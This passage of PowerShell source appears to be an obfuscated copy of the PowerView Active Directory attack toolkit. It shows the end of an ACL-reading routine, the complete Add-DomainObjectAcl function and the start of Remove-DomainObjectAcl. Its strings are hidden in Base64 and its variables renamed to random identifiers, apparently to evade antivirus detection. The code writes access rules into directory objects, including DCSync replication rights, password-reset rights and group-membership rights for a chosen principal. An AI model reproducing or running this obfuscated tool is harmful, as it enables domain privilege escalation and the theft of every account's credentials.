                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))]) {
                            ${2cb80a75d884491e94abf6a562b1df82} = Switch ($RightsFilter) {
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                                Default { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAwADAA'))) }
                            }
                            if ($_.ObjectType -eq ${2cb80a75d884491e94abf6a562b1df82}) {
                                $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) ${23ca6558fa4b4ce695fc6d89d0b892e5}
                                ${96f7b4a58e4b412499f1415c9f838e94} = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) ${23ca6558fa4b4ce695fc6d89d0b892e5}
                            ${96f7b4a58e4b412499f1415c9f838e94} = $True
                        }
                        if (${96f7b4a58e4b412499f1415c9f838e94}) {
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if (${4ec6a424a697407eb189b374cdcb24a9}) {
                                ${dc9a74085248498880d9f8794110be3f} = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAVAB5AHAAZQB8AEkAbgBoAGUAcgBpAHQAZQBkAE8AYgBqAGUAYwB0AFQAeQBwAGUAfABPAGIAagBlAGMAdABBAGMAZQBUAHkAcABlAHwASQBuAGgAZQByAGkAdABlAGQATwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA=')))) {
                                        try {
                                            ${dc9a74085248498880d9f8794110be3f}[$_.Name] = ${4ec6a424a697407eb189b374cdcb24a9}[$_.Value.toString()]
                                        }
                                        catch {
                                            ${dc9a74085248498880d9f8794110be3f}[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        ${dc9a74085248498880d9f8794110be3f}[$_.Name] = $_.Value
                                    }
                                }
                                ${40cde03bd65d4d39bc6718b47b26ac56} = New-Object -TypeName PSObject -Property ${dc9a74085248498880d9f8794110be3f}
                                ${40cde03bd65d4d39bc6718b47b26ac56}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEMATAA='))))
                                ${40cde03bd65d4d39bc6718b47b26ac56}
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEMATAA='))))
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
                }
            }
        }
    }
}
function Add-DomainObjectAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${3fd00557f1a8455fb6cf4f360a22419c},
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',
        [Guid]
        $RightsGUID
    )
    BEGIN {
        ${fb40bf1ad237423582107a464f0747b3} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw' = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $TargetLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $TargetSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${3353c7749a7e4809bab3bc9ad46447d5} = @{
            'Identity' = $PrincipalIdentity
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${8ee14393977545ddbd11a8a7e9eae7ad} = dc2f41a670d5455b8f64f106e1b09449 @3353c7749a7e4809bab3bc9ad46447d5
        if (-not ${8ee14393977545ddbd11a8a7e9eae7ad}) {
            throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcABhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
        }
    }
    PROCESS {
        ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${3fd00557f1a8455fb6cf4f360a22419c}
        ${638ba7c72920494eb76ef1cd205ca584} = dc2f41a670d5455b8f64f106e1b09449 @fb40bf1ad237423582107a464f0747b3
        ForEach (${cc2d6cd9e888461983c61e2d23cb76d9} in ${638ba7c72920494eb76ef1cd205ca584}) {
            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
            ${012ef5b9a0ab4c69918700d49b643059} = [System.Security.AccessControl.AccessControlType] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))
            ${3d7a85a9f6a64b37a1c49dcec29e8b63} = @()
            if ($RightsGUID) {
                ${4ec6a424a697407eb189b374cdcb24a9} = @($RightsGUID)
            }
            else {
                ${4ec6a424a697407eb189b374cdcb24a9} = Switch ($Rights) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMABmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                }
            }
            ForEach (${191b6bf4cb0b4919aff9170fb656ee7e} in ${8ee14393977545ddbd11a8a7e9eae7ad}) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $(${191b6bf4cb0b4919aff9170fb656ee7e}.distinguishedname) '$Rights' on $(${cc2d6cd9e888461983c61e2d23cb76d9}.Properties.distinguishedname)"
                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${191b6bf4cb0b4919aff9170fb656ee7e}.objectsid)
                    if (${4ec6a424a697407eb189b374cdcb24a9}) {
                        ForEach (${1df2c267ee6946f9b59b0dae3e08f61c} in ${4ec6a424a697407eb189b374cdcb24a9}) {
                            ${bf1d498483c849ffb6993746356cb07d} = New-Object Guid ${1df2c267ee6946f9b59b0dae3e08f61c}
                            ${a1ddb908d9ac49619c3f8d25d1bb9442} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                            ${3d7a85a9f6a64b37a1c49dcec29e8b63} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${a1ddb908d9ac49619c3f8d25d1bb9442}, ${012ef5b9a0ab4c69918700d49b643059}, ${bf1d498483c849ffb6993746356cb07d}, $InheritanceType
                        }
                    }
                    else {
                        ${a1ddb908d9ac49619c3f8d25d1bb9442} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        ${3d7a85a9f6a64b37a1c49dcec29e8b63} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${a1ddb908d9ac49619c3f8d25d1bb9442}, ${012ef5b9a0ab4c69918700d49b643059}, $InheritanceType
                    }
                    ForEach (${47c4a24caf944caa9c5108ae65d7de9d} in ${3d7a85a9f6a64b37a1c49dcec29e8b63}) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $(${191b6bf4cb0b4919aff9170fb656ee7e}.distinguishedname) rights GUID '$(${47c4a24caf944caa9c5108ae65d7de9d}.ObjectType)' on $(${cc2d6cd9e888461983c61e2d23cb76d9}.Properties.distinguishedname)"
                        ${e3d605e4f7a74c479e4d09ea708505e6} = ${cc2d6cd9e888461983c61e2d23cb76d9}.GetDirectoryEntry()
                        ${e3d605e4f7a74c479e4d09ea708505e6}.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
                        ${e3d605e4f7a74c479e4d09ea708505e6}.PsBase.ObjectSecurity.AddAccessRule(${47c4a24caf944caa9c5108ae65d7de9d})
                        ${e3d605e4f7a74c479e4d09ea708505e6}.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $(${191b6bf4cb0b4919aff9170fb656ee7e}.distinguishedname) '$Rights' on $(${cc2d6cd9e888461983c61e2d23cb76d9}.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function Remove-DomainObjectAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${3fd00557f1a8455fb6cf4f360a22419c},
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',
        [Guid]
        $RightsGUID
    )
    BEGIN {
        ${fb40bf1ad237423582107a464f0747b3} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw' = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $TargetLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $TargetSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${3353c7749a7e4809bab3bc9ad46447d5} = @{
            'Identity' = $PrincipalIdentity
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${8ee14393977545ddbd11a8a7e9eae7ad} = dc2f41a670d5455b8f64f106e1b09449 @3353c7749a7e4809bab3bc9ad46447d5
        if (-not ${8ee14393977545ddbd11a8a7e9eae7ad}) {
            throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcABhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
        }
    }
    PROCESS {
        ${fb40bf1ad237423582107a464f0747b3}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${3fd00557f1a8455fb6cf4f360a22419c}
        ${638ba7c72920494eb76ef1cd205ca584} = dc2f41a670d5455b8f64f106e1b09449 @fb40bf1ad237423582107a464f0747b3
        ForEach (${cc2d6cd9e888461983c61e2d23cb76d9} in ${638ba7c72920494eb76ef1cd205ca584}) {
            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
            ${012ef5b9a0ab4c69918700d49b643059} = [System.Security.AccessControl.AccessControlType] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))
            ${3d7a85a9f6a64b37a1c49dcec29e8b63} = @()
            if ($RightsGUID) {
                ${4ec6a424a697407eb189b374cdcb24a9} = @($RightsGUID)
            }
            else {
                ${4ec6a424a697407eb189b374cdcb24a9} = Switch ($Rights) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMABmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                }
            }
            ForEach (${191b6bf4cb0b4919aff9170fb656ee7e} in ${8ee14393977545ddbd11a8a7e9eae7ad}) {
                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $(${191b6bf4cb0b4919aff9170fb656ee7e}.distinguishedname) '$Rights' from $(${cc2d6cd9e888461983c61e2d23cb76d9}.Properties.distinguishedname)"
                try {
